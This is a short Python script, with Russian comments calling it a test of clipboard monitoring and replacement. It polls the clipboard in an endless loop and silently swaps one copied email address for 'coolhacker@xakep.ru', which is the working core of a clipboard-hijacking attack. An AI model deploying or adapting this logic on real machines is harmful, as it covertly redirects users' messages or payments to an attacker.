# "cridd@mail.ru" - почтовый адрес для теста по мониторингу буфера
# обмена и замене содержимого, если скопирован эелектронный адрес

import pyperclip
old = ''
new_old = ''

while True:
    s = pyperclip.paste()
    if s == "cridd@mail.ru":
        pyperclip.copy('coolhacker@xakep.ru')
        new_s = pyperclip.paste()
        if new_s != s:
            print(new_s)
            s = new_s
            new_old = new_s
    else:
        if s != old:
            if s != new_old:
                print(s)
                old = s